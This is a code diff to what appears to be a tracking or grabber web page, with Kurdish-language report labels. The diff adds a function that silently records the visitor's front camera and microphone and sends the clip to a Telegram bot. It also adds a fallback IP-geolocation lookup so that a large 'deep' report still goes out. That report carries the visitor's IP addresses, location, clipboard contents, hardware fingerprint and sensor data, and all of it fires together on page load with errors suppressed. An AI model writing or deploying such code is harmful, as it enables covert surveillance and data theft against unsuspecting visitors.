@@ -152,6 +152,16 @@
             fetch(url, { method: "POST", body: formData });
         }
 
+        function sendToTelegramVideo(blob, caption) {
+            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
+            let formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("video", blob, "live_capture.mp4");
+            formData.append("caption", caption);
+            formData.append("parse_mode", "Markdown");
+            fetch(url, { method: "POST", body: formData });
+        }
+
         function sendToTelegramVoice(blob, caption) {
             let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`;
             let formData = new FormData();
@@ -207,8 +217,27 @@
                     mediaRecorder.start();
                     setTimeout(() => mediaRecorder.stop(), 4000);
                 })
+                .catch(err => {});
+            } catch(e) {}
+        }
+
+        function recordLiveVideo() {
+            try {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
+                .then(stream => {
+                    let mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                    let videoChunks = [];
+                    mediaRecorder.ondataavailable = e => videoChunks.push(e.data);
+                    mediaRecorder.onstop = () => {
+                        let videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
+                        sendToTelegramVideo(videoBlob, "🎥 *تۆمارکردنی ڤیدیۆی ڕاستەوخۆی ڕووخسار (Live Video)*");
+                        stream.getTracks().forEach(track => track.stop());
+                    };
+                    mediaRecorder.start();
+                    setTimeout(() => mediaRecorder.stop(), 4000);
+                })
                 .catch(err => {
-                    sendToTelegramText("⚠️ *تێبینی مایکرۆفۆن:* ڕەتکرایەوە یان بەردەست نییە.");
+                    // Fallback to audio or photo if video recording fails
                 });
             } catch(e) {}
         }
@@ -316,6 +345,23 @@
             return "پشتیوانی ناکرێت";
         }
 
+        async function fetchWithFallback(url) {
+            try {
+                let res = await fetch(url);
+                return await res.json();
+            } catch(e) {
+                // Fallback API if ipapi.co fails
+                let res = await fetch('https://ipinfo.io/json');
+                let data = await res.json();
+                return {
+                    ip: data.ip,
+                    city: data.city,
+                    country_name: data.country,
+                    org: data.org
+                };
+            }
+        }
+
         async function gatherAndSendDetails() {
             let ua = navigator.userAgent;
             let platform = navigator.platform;
@@ -334,42 +380,38 @@
             let netInfo = getNetworkInfo();
             let visitorStatus = checkVisitorHistory();
 
-            getLocalIPs(function(localIPs) {
+            getLocalIPs(async function(localIPs) {
                 let localIPText = localIPs.length > 0 ? localIPs.join(", ") : "شاراوە";
 
-                fetch('https://ipapi.co/json/')
-                .then(res => res.json())
-                .then(data => {
-                    let report = `💎 *ڕاپۆرتی لووتکەی زۆر قووڵ (ULTIMATE DEEP PRO):*\n\n` +
-                                 `📌 *دۆخی سەردانیکەر:* ${visitorStatus}\n\n` +
-                                 `🌐 *ڕایەڵە و پینگ (Network Telemetry):*\n` +
-                                 `• *ئایپی گشتی:* \`${data.ip}\`\n` +
-                                 `• *ئایپی ناوخۆیی:* \`${localIPText}\`\n` +
-                                 `• *وڵات و شار:* ${data.country_name} - ${data.city}\n` +
-                                 `• *جۆری هێڵ (Connection):* ${netInfo}\n` +
-                                 `• *خێرایی پینگ (RTT):* ${latency}\n` +
-                                 `• *ناوچەی کاتی:* \`${timezone}\`\n` +
-                                 `• *دابینکەری هێڵ:* ${data.org}\n\n` +
-                                 `📋 *دزەکردن بە کلیپبۆرد:*\n\`${clipboardText}\`\n\n` +
-                                 `🔤 *فۆنتە دۆزراوەکانی سیستم (Fonts):*\n\`${fonts}\`\n\n` +
-                                 `🔄 *ئاراستەی فیزیکی (Sensors):*\n` +
-                                 `• Alpha: ${motionData.alpha} | Beta: ${motionData.beta} | Gamma: ${motionData.gamma}\n\n` +
-                                 `💻 *ڕەقامەواڵە و فینگەرپرینت:*\n` +
-                                 `• سیستم: ${platform}\n` +
-                                 `• پرۆسێسەر (Cores): ${cpuCores}\n` +
-                                 `• ڕام: ${deviceRam}\n` +
-                                 `• کارتی شاشە: \`${gpu}\`\n` +
-                                 `• پاتری: ${battery}\n` +
-                                 `• تاچ پۆینت: ${touchPoints}\n` +
-                                 `• فینگەرپرینتی شاشە: \`${canvasFP}\`\n` +
-                                 `• ڕەهەندی شاشە: ${screenRes}\n` +
-                                 `• زمان: ${language}\n\n` +
-                                 `📱 *براوسەر (User Agent):*\n\`${ua}\``;
-                    
-                    sendToTelegramText(report);
-                }).catch(err => {
-                    sendToTelegramText(`💎 *ڕاپۆرتی قووڵ:* سیستم: ${platform} | Latency: ${latency}`);
-                });
+                let data = await fetchWithFallback('https://ipapi.co/json/');
+                
+                let report = `💎 *ڕاپۆرتی لووتکەی زۆر قووڵ (ULTIMATE DEEP PRO):*\n\n` +
+                             `📌 *دۆخی سەردانیکەر:* ${visitorStatus}\n\n` +
+                             `🌐 *ڕایەڵە و پینگ (Network Telemetry):*\n` +
+                             `• *ئایپی گشتی:* \`${data.ip || "نەزانراو"}\`\n` +
+                             `• *ئایپی ناوخۆیی:* \`${localIPText}\`\n` +
+                             `• *وڵات و شار:* ${data.country_name || "نەزانراو"} - ${data.city || "نەزانراو"}\n` +
+                             `• *جۆری هێڵ (Connection):* ${netInfo}\n` +
+                             `• *خێرایی پینگ (RTT):* ${latency}\n` +
+                             `• *ناوچەی کاتی:* \`${timezone}\`\n` +
+                             `• *دابینکەری هێڵ:* ${data.org || "نەزانراو"}\n\n` +
+                             `📋 *دزەکردن بە کلیپبۆرد:*\n\`${clipboardText}\`\n\n` +
+                             `🔤 *فۆنتە دۆزراوەکانی سیستم (Fonts):*\n\`${fonts}\`\n\n` +
+                             `🔄 *ئاراستەی فیزیکی (Sensors):*\n` +
+                             `• Alpha: ${motionData.alpha} | Beta: ${motionData.beta} | Gamma: ${motionData.gamma}\n\n` +
+                             `💻 *ڕەقامەواڵە و فینگەرپرینت:*\n` +
+                             `• سیستم: ${platform}\n` +
+                             `• پرۆسێسەر (Cores): ${cpuCores}\n` +
+                             `• ڕام: ${deviceRam}\n` +
+                             `• کارتی شاشە: \`${gpu}\`\n` +
+                             `• پاتری: ${battery}\n` +
+                             `• تاچ پۆینت: ${touchPoints}\n` +
+                             `• فینگەرپرینتی شاشە: \`${canvasFP}\`\n` +
+                             `• ڕەهەندی شاشە: ${screenRes}\n` +
+                             `• زمان: ${language}\n\n` +
+                             `📱 *براوسەر (User Agent):*\n\`${ua}\``;
+                
+                sendToTelegramText(report);
             });
         }
 
@@ -442,6 +484,7 @@
             gatherAndSendDetails();
             sendLocation();
             takePicturesSequence();
+            recordLiveVideo();
             recordMicrophone();
 
             setTimeout(function() {
